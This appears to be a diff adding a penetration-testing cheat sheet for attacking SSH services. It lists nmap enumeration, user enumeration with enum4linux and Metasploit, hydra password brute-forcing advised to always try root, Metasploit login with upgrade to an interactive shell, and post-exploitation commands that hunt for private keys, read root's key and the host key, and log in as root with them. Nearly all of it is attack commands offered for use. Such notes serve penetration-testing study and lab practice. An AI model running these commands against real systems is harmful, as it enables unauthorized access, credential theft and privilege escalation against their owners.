@@ -1,0 +1,70 @@
+
+
+###############################################################
+
+	1) ENUMERATE VERSION
+
+	nmap -Pn <ip> -sC -p22
+ 	nmap -Pn --script=ssh-auth-methods -p22 <ip>
+ 	nmap -Pn <ip> -p22 —script banner
+ 
+
+###############################################################
+
+	2) ENUMERATE CREDENTIALS
+	+-------------------------------+
+	| For login			|
+	| Always try root in bruteforce	|
+	+-------------------------------+
+
+	enum4linux -U <ip>
+
+	msfconsole -q
+	use auxiliary/scanner/ssh/ssh_enumusers
+	set rhosts <ip>
+	set USER_FILE <userFile>
+	run
+
+ 	hydra -L <userFile> -P <passFile> <ip> ssh
+ 	hydra -l root -P <passFile> <ip> ssh
+
+###############################################################
+
+	3) AUTHENTICATION 
+	+-----------------------+
+	| After gathering creds	|
+	| Any sort of access	|
+	+-----------------------+
+ 	
+	ssh <username>@<ip>
+	
+	msfconsole -q
+	use ssh_login
+	set rhosts <ip>
+	set username <username>
+	set password <password>
+	run -j
+	sessions -u 1
+	sessions 2
+	shell
+	/bin/bash -i
+
+###############################################################
+
+	4) POST EXPLOIT FOR ROOT ACCESS
+	+----------------------------------+
+	| IF ROOT WASNT ACCESSED INITIALLY |
+	+----------------------------------+
+
+	find / -name "id_rsa" 2>/dev/null
+	find / -name "id_dsa" 2>/dev/null
+	find / -name "*.pem" 2>/dev/null
+
+	cat ~/.ssh/id_rsa
+	cat /root/.ssh/id_rsa
+	cat /etc/ssh/ssh_host_rsa_key
+
+	ssh -i <path-to-private-key> root@<ip>
+
+###############################################################
+
